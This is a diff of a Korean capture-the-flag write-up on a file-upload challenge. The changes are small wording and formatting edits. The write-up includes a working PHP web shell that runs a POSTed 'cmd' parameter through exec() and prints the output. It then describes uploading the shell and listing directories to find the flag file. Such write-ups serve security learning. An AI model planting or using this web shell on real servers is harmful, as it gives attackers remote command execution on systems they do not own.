@@ -6,7 +6,7 @@
 
 ### 풀이
 ![Upload Page](/img/file-upload-1.png)  
-여기도 귀여운 너구리 한 마리가 반겨준다..  
+여기도 ~~사나운~~ 귀여운 너구리 한 마리가 반겨준다..  
 그리고 URL을 보면 해당 사이트가 PHP를 사용하는 것을 알 수 있다.
 
 PHP로 웹셸을 작성 후  
@@ -16,7 +16,8 @@ PHP로 웹셸을 작성 후
 	if ( isset($cmd) ) { $x = exec("$cmd", $output); }
 	echo	"<form action='$_SERVER[PHP_SELF]' method='post'>".
 			"<input type='text' name='cmd'/>".
-			"</form><hr/><pre>";
+		"</form><hr/>".
+		"<pre>";
 	foreach ($output as $o) {
 		echo $o."<br/>";
 	}
@@ -30,7 +31,7 @@ PHP로 웹셸을 작성 후
 
 이제 위 경로로 접속하면  
 ![Webshell](/img/file-upload-4.png)  
-웹셸을 사용할 수 있다.
+웹셸을 사용할 수 있다. 여기서 시스템 명령어를 사용하면 된다.
 
 ![Webshell - ls -lhA ../](/img/file-upload-5.png)  
 `flag`라는 이름을 가진 파일을 찾았다.
